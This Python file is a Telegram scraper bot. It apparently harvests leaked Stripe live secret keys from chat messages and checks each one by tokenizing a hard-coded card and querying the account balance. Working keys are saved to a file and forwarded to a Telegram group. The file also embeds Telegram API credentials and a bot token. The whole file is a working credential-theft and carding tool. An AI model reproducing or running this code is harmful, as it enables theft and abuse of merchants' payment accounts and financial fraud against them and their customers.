import os
import re
import requests
from time import sleep
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup

def get_balance(sks):
  skval = 100
  abl = ""
  try:
    re = requests.get(f"https://api.stripe.com/v1/balance", auth=(sks, ""))
    bal_dt = re.json()
    curr = bal_dt["available"][0]["currency"]
    balance = bal_dt["available"][0]["amount"] / skval
    pending = bal_dt["pending"][0]["amount"] / skval

    currency_mapping = {
        "usd": ("$", "USD - United States 🇺🇸"),
        "inr": ("₹", "INR - India 🇮🇳"),
        "cad": ("$", "CAD - Canada 🇨🇦"),
        "aud": ("A$", "AUD - Australia 🇦🇺"),
        "aed": ("د.إ", "AED - United Arab Emirates 🇦🇪"),
        "sgd": ("S$", "SGD - Singapore 🇸🇬"),
        "nzd": ("$", "NZD - New Zealand 🇳🇿"),
        "eur": ("€", "EUR - EUROPE 🇪🇺"),
        "gbp": ("£","GBP - United Kingdom 🇬🇧"),
        "bgn": ("€","BGN - Bulgaria 🇧🇬"),
        "brl": ("R$","BRL - Brazil 🇧🇷"),
        "chf": ("Fr.", "CHF - Switzerland 🇨🇭"),
        "czk": ("Kč", "CZK - Czech Republic 🇨🇿"),
        "dkk": ("-kr.", "DKK - Denmark 🇩🇰"),
        "hkd": ("$", "HDK - Hong Kong 🇭🇰"),
        "hrk": ("kn", "HRK - Croatia 🇭🇷"),
        "jpy": ("¥", "JPY - Japan 🇯🇵"),
        "mxn": ("$", "MXN - Mexico 🇲🇽"),
        "myr": ("RM", "MYR - Malaysia 🇲🇾"),
        "nok": ("-kr.", "NOK - Norway 🇳🇴"),
        "pln": ("zł", "PLN - Poland 🇵🇱"),
        "ron": ("lei", "RON - Romania 🇷🇴"),
        "rol": ("lei", "ROL - Romania 🇷🇴"),
        "sek": ("-kr.", "SEK - Sweden 🇸🇪"),
        "thb": ("฿", "THB - Thailand 🇹🇭")
    }

    if curr in currency_mapping:
        currn, currs = currency_mapping[curr]
        balance = str(currn) + str(balance)
        pending = str(currn) + str(pending)
        country = str(currs)
        abl = f"**Balance ￫ {balance}\nPending ￫ {pending}\nSk INFO ￫ {country}\n\n**"
    
    return abl
  except BaseException as e:
    #print(e)
    return ""
    
async def post_non_blocking(sks):
    text = ""
    text += await loop.run_in_executor(None, get_tokens, sks)
    return text

def get_tokens(sks):
    abll = get_balance(sks)
    info = ""
    data = "card[number]=4512238502012742&card[exp_month]=12&card[exp_year]=2025&card[cvc]=354"
    
    rep = requests.post(f"https://api.stripe.com/v1/tokens", data=data, auth=(sks, ""))
    r1 = rep.text
    r2 = rep.json()
    #print(r2)
    if "tok_" in r1:
        res = "LIVE KEY ✅"
        return f"""**Key ￫ `{sks}`
Response ￫ {res}**
{abll}"""
        #return f"**Key ￫ `{sks}`\nResponse ￫ {res}\n**{abll}"
    elif "Your card was declined." in r1:
        res = "LIVE KEY ✅"
        return f"""**Key ￫ `{sks}`
Response ￫ {res}**
{abll}"""
    elif "rate_limit" in r1:
        res = "Rate Limited ⚠️"
        return f"""**Key ￫ `{sks}`
Response ￫ {res}**
{abll}"""
    elif "Invalid API Key provided" in r1:
        return ""
    elif "testmode_charges_only" in r1:
        return ""
    elif "api_key_expired" in r1:
        return ""
    elif "Your card is not supported." in r1:
        res = "Your card is not supported ⚠️"
        return f"""**Key ￫ `{sks}`
Response ￫ {res}**
{abll}"""
    else:
        return "" 
      

START_BUTTONS = InlineKeyboardMarkup(

[[
InlineKeyboardButton('CHANNEL 🔥', url='https://t.me/elitekingofficial'),
InlineKeyboardButton('DEV 👨‍💻', url='https://t.me/abdulkuddusxbd')

]])


api_id = "26965884"
api_hash = "a52781e75237a60df9e182344ef45204"
bot_token = "5859654365:AAG07LcrLXvK_BGHkKX9T9o3f1CZJZwDNuo"

user = Client(
    "scrapper_user",
    api_id=api_id,
    api_hash=api_hash,
    #session_string=#os.getenv("SESSION_STRING"),
)


bot = Client(
    "scrapper_bot",
    api_id=api_id,
    api_hash=api_hash,
    bot_token=bot_token)
    

class TempDB:
    CMD = [".", "!", "/"]
    ADMIN = [5195866238, 5848565704]

    
@bot.on_message(filters.command("livesk", [".", "/"])) #& filters.user([5195866238,5848565704]))
async def cmd_help(client, message):
    if int(message.from_user.id) not in TempDB.ADMIN:
        return await message.reply_text("❌ **Owner Only!**")
    document = "livesk.txt"
    caption = "Done ✅"
    await message.reply_document(document=document,
                                 caption=caption)

def filter_sk(text):
    matches = re.findall(r"sk_live_\S+", text)
    fullsk = [match for match in matches if "xxxxx" not in match and "*****" not in match]
    resultx = ""
    for sk in fullsk:
        if len(sk) == 32:
            resultx += f"{sk}\n"
        elif len(sk) == 42:
            resultx += f"{sk}\n"
        elif len(sk) == 107:
            resultx += f"{sk}\n"
    return resultx


@user.on_message(filters.regex("sk_live_"))
async def sk_find_all(client, m):
    tex = m.text
    sks = filter_sk(tex)
    
    livesk = get_tokens(sks)
    
    liveskall = filter_sk(livesk)
    
    print(liveskall)
    with open("livesk.txt", "a+") as f:
        f.seek(0)
        if liveskall in f.read():
            return
        f.write(f'{liveskall}\n')
        try:
            #await bot.send_message(chat_id="md_abdul_kuddus", text=livesk, disable_web_page_preview=True, reply_markup=START_BUTTONS)
            groupid = f"-1919087738"
            await bot.send_message(chat_id=f"{groupid}", text=livesk, disable_web_page_preview=True, reply_markup=START_BUTTONS)
            sleep(3)
        except Exception as e:
             print("Error sending message:", str(e))

print("bot Run ✅")

try:
    user.start()
except Exception as e:
    print("User error:", str(e))
try:
    bot.run()
except Exception as e:
    print("Bot error:", str(e))




